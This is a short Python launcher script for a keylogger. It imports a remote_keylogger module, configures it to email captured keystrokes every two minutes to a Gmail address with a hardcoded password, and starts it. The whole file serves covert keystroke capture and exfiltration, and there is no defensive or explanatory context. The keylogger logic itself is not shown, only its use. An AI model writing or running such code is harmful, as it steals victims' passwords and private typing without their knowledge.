#!/usr/bin/env python
#calls remote logger, emails every 2 min to example email
import remote_keylogger

my_keylogger = remote_keylogger.Keylogger(120, "email@gmail.com", "password")
my_keylogger.start()
